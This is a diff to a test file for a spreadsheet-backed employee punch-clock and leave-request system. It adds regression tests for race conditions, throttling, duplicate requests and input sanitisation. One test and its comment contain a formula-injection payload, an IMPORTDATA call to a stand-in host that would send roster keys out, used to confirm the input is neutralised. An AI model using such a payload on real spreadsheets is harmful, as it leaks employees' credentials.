@@ -145,7 +145,7 @@ function make(opts) {
   const codeFns = ['readSheetAsObjects', 'readEventsSince', 'normCellTs', 'normCellDate', 'lastCountedEvent', 'findRosterByKey', 'findRosterByEmpId', 'handleClock', 'haversineM',
                    'findManagerByKey', 'actingName_', 'nowTaipeiIso', 'todayTaipeiStr', 'tsMs', 'tsDateStr', 'tsHm', 'approvedHoursOfShift', 'pairShifts', 'addDaysStr', 'hmToMs',
                    'dayPunchSegments', 'dayReferenceIncomplete', 'normShiftTime', 'ensureRosterHeaders', 'setRosterCell', 'activeNotices', 'noticeSheet', 'ensureNoticeHeaders',
-                   'normNoticeEndsOn', 'noticeAuth', 'handleMgrAddNotice', 'checkAdmin', 'genKey', 'buildLatestApprovedMap', 'handleMgrAddEmployeeUnlocked_', 'nextEmpId'];
+                   'normNoticeEndsOn', 'noticeAuth', 'handleMgrAddNotice', 'checkAdmin', 'genKey', 'buildLatestApprovedMap', 'handleMgrAddEmployeeUnlocked_', 'nextEmpId', 'sheetSafeText_'];
   const codeConsts = ['EVENTS_HEADERS', 'ROSTER_HEADERS', 'SAME_TYPE_LOCK_MIN', 'ACCURACY_CREDIT_CAP_M', 'LOW_ACCURACY_M', 'MONTHLY_PAIR_WINDOW_HOURS', 'REJECTED_IN_BREAK_MIN',
                       'REJECTED_IN_MISTAP_SEC', 'LEAVE_TYPES', 'NOTICE_HEADERS', 'NOTICE_MAX_SHOW', 'NOTICE_MAX_LEN', 'APPROVED_HEADERS', 'MANAGERS_HEADERS', 'TRIP_NOTE'];
   const parts = [codeConsts.map((c) => extractConst(SRC.code, c)).join('\n'), codeFns.map((f) => extract(SRC.code, f)).join('\n'), SRC.liff, SRC.rest, SRC.req];
@@ -165,15 +165,49 @@ console.log('━━ 已確認的問題（KNOWN：寫的是應該要的行為，�
 /* 1. 打卡沒有「同一人」的序列化：busy 鍵只綁 id_token（20 秒），handleClock 用打卡前讀的 events 判重複、沒有鎖。
    兩筆上班卡同時到（Google 慢到 20 秒以上後同仁重開畫面再按、或兩個 LIFF 視窗）→ 兩張都 ok →
    pairShifts 把第一張收成「下班忘刷卡」→ 薪資 payCollect 忘刷 +1（光復每日倒扣 100、央廚 3 次全勤歸零）。 */
-KNOWN('兩筆上班卡同時到（都在對方寫入前讀表）：第二張應擋成 rejected_duplicate，不能兩張都 ok', () => {
+// 2026-11-03 修：Liff.gs liffPunchFor_ 寫入前在 CacheService 放「這個人剛送出哪一型」的記號，讀完 events 後併進防呆（liffWithMark_）。
+// handleClock 本身（舊連結 clock.html）沒改，所以這裡走 LINE 打卡的真路徑 liffPunchFor_，第二筆拿的是第一筆寫入前讀的那份 events。
+const stalePunch = (m, type, extra) => {
+  const sb = m.sb, snap = sb.liffPunchRead_(m.self, 'E01', type);
+  return () => {
+    const real = sb.liffPunchRead_;
+    sb.liffPunchRead_ = () => snap;   // 這一筆用的是「對方寫入前」讀的 events
+    try { return sb.liffPunchFor_('U1', sb.readSheetAsObjects(m.self.sh.roster).rows[0], m.self, type, Object.assign({}, HERE, extra || {}), null); }
+    finally { sb.liffPunchRead_ = real; }
+  };
+};
+ok('兩筆上班卡同時到（都在對方寫入前讀表）：第二張被 10 分鐘鎖擋下、只寫進一張', () => {
   const m = make({ now: T('2026-11-03T09:00:00'), self: { roster: [ME], events: [[T('2026-11-02T22:00:00'), 'E01', 'out']] } });
-  const sb = m.sb;
-  const read1 = sb.liffPunchRead_(m.self, 'E01', 'in'), read2 = sb.liffPunchRead_(m.self, 'E01', 'in');   // 兩個執行緒各自讀完
-  const r1 = sb.handleClock(Object.assign({ key: 'K1', type: 'in', device_id: 'D1' }, HERE), read1, null);
-  sb.__now += 3000;
-  const r2 = sb.handleClock(Object.assign({ key: 'K1', type: 'in', device_id: 'D1' }, HERE), read2, null);
-  assert.strictEqual(r1.status, 'ok');
-  assert.strictEqual(r2.status, 'rejected_duplicate', '第二張也 ok：' + r2.status);
+  const a = stalePunch(m, 'in'), b = stalePunch(m, 'in');   // 兩個執行緒各自讀完
+  const r1 = a();
+  m.sb.__now += 3000;
+  const r2 = b();
+  assert.strictEqual(r1.ok, true, JSON.stringify(r1));
+  assert.strictEqual(r2.ok, false, '第二張也 ok');
+  assert.ok(/10 分鐘內不能打上班卡/.test(r2.reason), r2.reason);
+  assert.strictEqual(m.events().filter((e) => e.type === 'in' && e.status === 'ok').length, 1);
+});
+ok('第一筆沒算數（不在範圍內）：記號還原，幾秒後在店裡再按照常打得進去', () => {
+  const m = make({ now: T('2026-11-03T09:00:00'), self: { roster: [ME], events: [[T('2026-11-02T22:00:00'), 'E01', 'out']] } });
+  const far = stalePunch(m, 'in', { lat: 24.79, lng: 121.02, accuracy: 5 });
+  assert.strictEqual(far().status, 'rejected_out_of_range');
+  m.sb.__now += 5000;
+  const r = stalePunch(m, 'in')();
+  assert.strictEqual(r.ok, true, JSON.stringify(r));
+});
+ok('同型過了 10 分鐘：沒帶 confirm_same 回 need_confirm 且不寫入；帶了才收', () => {
+  const m = make({ now: T('2026-11-03T13:00:00'), self: { roster: [ME], events: [[T('2026-11-03T09:00:00'), 'E01', 'in']] } });
+  const n0 = m.events().length;
+  const r = stalePunch(m, 'in')();
+  assert.strictEqual(r.need_confirm, true, JSON.stringify(r));
+  assert.strictEqual(r.last.hm, '09:00');
+  assert.strictEqual(m.events().length, n0, '沒確認就寫進去了');
+  const r2 = stalePunch(m, 'in', { confirm_same: true })();
+  assert.strictEqual(r2.ok, true, JSON.stringify(r2));
+});
+ok('（對照）不同型照常打、不跳確認：上班後 8 小時打下班', () => {
+  const m = make({ now: T('2026-11-03T17:00:00'), self: { roster: [ME], events: [[T('2026-11-03T09:00:00'), 'E01', 'in']] } });
+  assert.strictEqual(stalePunch(m, 'out')().ok, true);
 });
 ok('（後果）兩張 ok 上班卡＋一張下班卡：第一張被當成下班忘刷卡（薪資 payCollect 以此算忘刷）', () => {
   const m = make({ now: T('2026-11-03T18:00:00'), self: { roster: [ME], events: [[T('2026-11-03T09:00:00'), 'E01', 'in'], [T('2026-11-03T09:00:03'), 'E01', 'in'], [T('2026-11-03T18:00:00'), 'E01', 'out']] } });
@@ -187,14 +221,14 @@ ok('（後果）兩張 ok 上班卡＋一張下班卡：第一張被當成下班
 /* 2. 公式注入：Requests.gs 2026-10-29 已擋（reqSheetText_），但各店 程式碼.js 的主管輸入還沒擋——
    公告內容（≤120 字）、新增同仁姓名（≤20 字）直接 appendRow，= 開頭會被 Sheets 當公式跑；
    值班主管鑰匙就能寫 =IMPORTDATA("https://…/?"&JOIN(",",roster!C2:C50)) 把名冊鑰匙、managers 鑰匙送出去。 */
-KNOWN('主管發公告：= 開頭的文字寫進 notices 前要換全形（同 Requests.gs reqSheetText_）', () => {
+ok('主管發公告：= 開頭的文字寫進 notices 前要換全形（同 Requests.gs reqSheetText_）', () => {
   const m = make({ now: T('2026-11-03T09:00:00'), self: { roster: [ME], events: [] } });
   const r = m.sb.handleMgrAddNotice({ mgr_key: 'MK', text: '=IMPORTDATA("https://x.example/?"&JOIN(",",roster!C2:C9))', ends_on: '' });
   assert.ok(r.ok);
   const cell = m.self.sh.notices.values[1][1];
   assert.ok(!/^[=+\-@]/.test(String(cell)), '寫進分頁的是：' + cell);
 });
-KNOWN('主管新增同仁：姓名 = 開頭要換全形', () => {
+ok('主管新增同仁：姓名 = 開頭要換全形', () => {
   const m = make({ now: T('2026-11-03T09:00:00'), self: { roster: [ME], events: [] } });
   const r = m.sb.handleMgrAddEmployeeUnlocked_({ mgr_key: 'MK', name: '=roster!C2' });
   assert.ok(r.ok);
@@ -204,7 +238,7 @@ KNOWN('主管新增同仁：姓名 = 開頭要換全形', () => {
 
 /* 3. LineHub 節流每次計數都重設 TTL（Liff.gs liffThrottled_ 刻意避開的寫法）：被擋後只要 10 分鐘內再試一次，鎖就再延 10 分鐘。
    新同仁打錯全名 5 次 → 訊息說「請 10 分鐘後再試」→ 8 分鐘後再試（還是擋）→ 永遠解不開，直到完全停 10 分鐘。機器人每人 20 則/分同理。 */
-KNOWN('綁定節流：被擋後每 8 分鐘試一次，第 5 次（距第一次被擋 40 分鐘）應該已經解鎖', () => {
+ok('綁定節流：被擋後每 8 分鐘試一次，第 5 次（距第一次被擋 40 分鐘）應該已經解鎖', () => {
   const m = make({ now: T('2026-11-03T09:00:00'), self: { roster: [ME], events: [] }, hub: true });
   const sb = m.sb;
   for (let i = 0; i < 6; i++) { sb.lineHubThrottled_('bind', 'U9', 5, 600); sb.__now += 30000; }
@@ -222,7 +256,7 @@ ok('（對照）Liff.gs liffThrottled_ 是固定時間窗：同樣節奏不會�
 
 /* 4. 同日同類申請的重複檢查只看「審核中」：核准後可以再送一模一樣的一筆，主管批次核准就兩筆都算。
    加班：payCompMonthBook 把每筆 approved 加班的時數相加 → 本月補休帳 ot_h 翻倍（只影響顯示與補休餘額，不直接加薪）。 */
-KNOWN('同日同時段加班核准後再送一筆：應擋（duplicate）', () => {
+ok('同日同時段加班核准後再送一筆：應擋（duplicate）', () => {
   const m = make({ now: T('2026-11-03T16:00:00'), self: { roster: [ME], events: [] } });
   const sb = m.sb;
   const a = sub(sb, { kind: 'ot', date: '2026-11-01', start: '18:00', end: '20:00', reason: '外送多' });
@@ -230,22 +264,33 @@ KNOWN('同日同時段加班核准後再送一筆：應擋（duplicate）', () =
   const b = sub(sb, { kind: 'ot', date: '2026-11-01', start: '18:00', end: '20:00', reason: '外送多' });
   assert.strictEqual(b.error, 'duplicate', '第二筆被收下：' + JSON.stringify(b.request || b));
 });
-ok('（後果）兩筆同日加班都核准 → payCompMonthCalc 的 ot_h 是 4 小時而不是 2', () => {
+ok('（對照）同日不重疊的第二段加班照收；時段重疊（18:30–19:30）擋；作廢後可重送', () => {
   const m = make({ now: T('2026-11-03T16:00:00'), self: { roster: [ME], events: [] } });
   const sb = m.sb;
   const a = sub(sb, { kind: 'ot', date: '2026-11-01', start: '18:00', end: '20:00', reason: '外送多' });
   sb.handleMgrReqDecide_({ mgr_key: 'MK', id: a.request.id, decision: 'approve' });
-  const b = sub(sb, { kind: 'ot', date: '2026-11-01', start: '18:00', end: '20:00', reason: '外送多' });
-  sb.handleMgrReqDecideBatch_({ mgr_key: 'MK', ids: [b.request.id], decision: 'approve' });
-  const rows = sb.reqRows_(m.self).filter((r) => r.kind === 'ot' && r.status === 'approved');
-  const p = { payNum: (v) => Number(v) || 0, payR2: (v) => Math.round(v * 100) / 100, Object, String, Math };
-  vm.createContext(p); vm.runInContext(extract(SRC.pay, 'payCompMonthCalc'), p);
-  assert.strictEqual(p.payCompMonthCalc(rows.map((r) => ({ date: r.date, h: r.hours })), [], []).ot_h, 4);
+  assert.strictEqual(sub(sb, { kind: 'ot', date: '2026-11-01', start: '18:30', end: '19:30', reason: '外送多' }).error, 'duplicate');
+  const c = sub(sb, { kind: 'ot', date: '2026-11-01', start: '07:00', end: '08:00', reason: '早到備料' });
+  assert.ok(c.ok, JSON.stringify(c));
+  sb.handleMgrReqDecide_({ mgr_key: 'MK', id: c.request.id, decision: 'approve' });   // 審核中的那筆會被「同類審核中」規則擋，先核掉
+  assert.ok(sb.handleMgrReqVoid_({ mgr_key: 'MK', id: a.request.id, reason: '打錯' }).ok);
+  assert.ok(sub(sb, { kind: 'ot', date: '2026-11-01', start: '18:00', end: '20:00', reason: '外送多' }).ok);
+});
+ok('（對照）同日不同假別照收（一天多種假別）；同假別只填時數＝同一件擋', () => {
+  const m = make({ now: T('2026-11-03T16:00:00'), self: { roster: [ME], events: [] } });
+  const sb = m.sb;
+  const a = sub(sb, { kind: 'leave', date: '2026-11-05', leave_type: '事假', hours: 4, reason: '家裡有事' });
+  assert.ok(a.ok, JSON.stringify(a));
+  sb.handleMgrReqDecide_({ mgr_key: 'MK', id: a.request.id, decision: 'approve' });
+  const b = sub(sb, { kind: 'leave', date: '2026-11-05', leave_type: '特休假', hours: 4, reason: '休息' });
+  assert.ok(b.ok, JSON.stringify(b));
+  sb.handleMgrReqDecide_({ mgr_key: 'MK', id: b.request.id, decision: 'approve' });
+  assert.strictEqual(sub(sb, { kind: 'leave', date: '2026-11-05', leave_type: '事假', hours: 2, reason: '家裡有事' }).error, 'duplicate');
 });
 
 /* 5. 舊動作 liff_bind 用 String(r.key) === String(body.key) 找人：名冊若有一列在職但 key 空白（手動加的列），
    任何 LINE 帳號送 key:'' 就綁上那個人、之後以他的身分打卡。 */
-KNOWN('liff_bind 帶空 key：不能綁到 key 空白的在職列', () => {
+ok('liff_bind 帶空 key：不能綁到 key 空白的在職列', () => {
   const NOKEY = { emp_id: 'E09', name: '沒鑰匙', key: '', device_id: '', active: 'TRUE', line_user_id: '' };
   const m = make({ now: T('2026-11-03T09:00:00'), self: { roster: [ME, NOKEY], events: [] } });
   const r = m.sb.handleLiffBind_({ id_token: 'TOK_U3', key: '' });
@@ -254,25 +299,52 @@ KNOWN('liff_bind 帶空 key：不能綁到 key 空白的在職列', () => {
 
 /* 6. 綁定沒有鎖（handleMgrAddEmployee 有）：兩筆同時綁同一列，兩筆都讀到「還沒綁」→ 兩筆都回 ok、後寫的蓋掉先寫的，
    先綁的人畫面說成功、其實沒綁上。模擬交錯：第二筆讀到的是第一筆寫入前的名冊。 */
-KNOWN('兩個 LINE 同時綁同一列：第二筆應回 already_bound_other_user（要鎖＋鎖內重讀）', () => {
+// 2026-11-03 修：讀名冊到寫入包 ScriptLock、寫完 flush 才放鎖。真並發在 vm 裡跑不出來，
+// 改驗「每一次讀名冊都在鎖內、放鎖前有 flush」，再驗鎖拿到後第二筆讀到的是第一筆寫好的名冊 → already_bound_other_user。
+ok('兩個 LINE 同時綁同一列：讀名冊都在鎖內、放鎖前 flush；第二筆回 already_bound_other_user', () => {
   const NEW = { emp_id: 'E05', name: '新同仁', key: 'K5', device_id: '', active: 'TRUE', line_user_id: '' };
   const m = make({ now: T('2026-11-03T09:00:00'), self: { roster: [ME, NEW], events: [] } });
-  const sh = m.self.sh.roster, snapshot = sh.values.map((r) => r.slice()), real = sh.getDataRange;
-  let stale = false;
-  sh.getDataRange = () => (stale ? { getValues: () => snapshot.map((r) => r.slice()) } : real());
-  const a = m.sb.handleLiffBind_({ id_token: 'TOK_U2', key: 'K5' });
-  stale = true;
-  const b = m.sb.handleLiffBind_({ id_token: 'TOK_U3', key: 'K5' });
-  assert.ok(a.ok);
-  assert.strictEqual(b.error, 'already_bound_other_user', '第二筆也 ok，名冊最後綁的是 ' + sh.values[2][12]);
+  const sb = m.sb, sh = m.self.sh.roster, real = sh.getDataRange, log = [];
+  let held = false;
+  sb.LockService = { getScriptLock: () => ({ tryLock: () => { held = true; log.push('lock'); return true; }, waitLock: () => { held = true; },
+                                            releaseLock: () => { held = false; log.push('release'); } }) };
+  sb.SpreadsheetApp.flush = () => log.push('flush');
+  sh.getDataRange = () => { log.push(held ? 'read-in-lock' : 'read-outside'); return real(); };
+  const a = sb.handleLiffBind_({ id_token: 'TOK_U2', key: 'K5' });
+  const b = sb.handleLiffBind_({ id_token: 'TOK_U3', key: 'K5' });
+  assert.ok(a.ok, JSON.stringify(a));
+  assert.strictEqual(b.error, 'already_bound_other_user', JSON.stringify(b));
+  assert.ok(log.indexOf('read-outside') < 0, JSON.stringify(log));
+  assert.ok(log.join(',').indexOf('flush,release') >= 0, JSON.stringify(log));
+});
+ok('綁定拿不到鎖（10 秒）：回 busy、不寫名冊', () => {
+  const NEW = { emp_id: 'E05', name: '新同仁', key: 'K5', device_id: '', active: 'TRUE', line_user_id: '' };
+  const m = make({ now: T('2026-11-03T09:00:00'), self: { roster: [ME, NEW], events: [] } });
+  m.sb.LockService = { getScriptLock: () => ({ tryLock: () => false, releaseLock: () => {} }) };
+  assert.strictEqual(m.sb.handleLiffBind_({ id_token: 'TOK_U2', key: 'K5' }).error, 'busy');
+  assert.strictEqual(m.self.sh.roster.values[2][12], '');
 });
 
 /* 7. 忘打卡補「上班」：那天只有隔天凌晨的下班卡（歸前一天）時，補的上班時間沒有下限——補 02:00 也收，
    核定頁預填 02:00–01:00(+1)＝23 小時，主管沒看清楚就核成 23 小時。 */
-KNOWN('只有隔天 01:00 下班卡：補上班 02:00（＝23 小時班）應擋（上限 16 小時配對窗）', () => {
+ok('只有隔天 01:00 下班卡：補上班 02:00（＝23 小時班）應擋（上限 16 小時配對窗）', () => {
   const m = make({ now: T('2026-11-10T16:00:00'), self: { roster: [ME], events: [[T('2026-11-09T01:00:00'), 'E01', 'out']] } });
   const r = sub(m.sb, { kind: 'miss', date: '2026-11-08', miss_type: 'in', start: '02:00', reason: '忘記按' });
   assert.strictEqual(r.ok, false, '收下了：' + (r.summary || '') + '，核定頁會預填 ' + m.sb.reqSpanHours_('02:00', '01:00') + ' 小時');
+});
+ok('（對照）只有隔天 01:00 下班卡：補上班 17:00（8 小時）照收；開著的 08:00 上班卡補下班 05:00(+1)＝21 小時擋', () => {
+  const m = make({ now: T('2026-11-10T16:00:00'), self: { roster: [ME], events: [[T('2026-11-09T01:00:00'), 'E01', 'out'], [T('2026-11-06T08:00:00'), 'E01', 'in']].sort((x, y) => x[0] - y[0]) } });
+  const r = sub(m.sb, { kind: 'miss', date: '2026-11-08', miss_type: 'in', start: '17:00', reason: '忘記按' });
+  assert.ok(r.ok, JSON.stringify(r));
+  const r2 = sub(m.sb, { kind: 'miss', date: '2026-11-06', miss_type: 'out', end: '05:00', reason: '忘記按' });
+  assert.strictEqual(r2.error, 'bad_time', JSON.stringify(r2));
+  const r3 = sub(m.sb, { kind: 'miss', date: '2026-11-06', miss_type: 'out', end: '22:00', reason: '忘記按' });
+  assert.ok(r3.ok, JSON.stringify(r3));
+});
+ok('（對照）兩張都補：08:00–23:30 照收、08:00–07:00(+1) 擋', () => {
+  const m = make({ now: T('2026-11-10T16:00:00'), self: { roster: [ME], events: [] } });
+  assert.strictEqual(sub(m.sb, { kind: 'miss', date: '2026-11-07', miss_type: 'both', start: '08:00', end: '07:00', reason: '忘記按' }).error, 'bad_time');
+  assert.ok(sub(m.sb, { kind: 'miss', date: '2026-11-07', miss_type: 'both', start: '08:00', end: '23:30', reason: '忘記按' }).ok);
 });
 
 console.log('\n━━ 被推翻的假設（程式有擋住，留著當迴歸守門）━━');
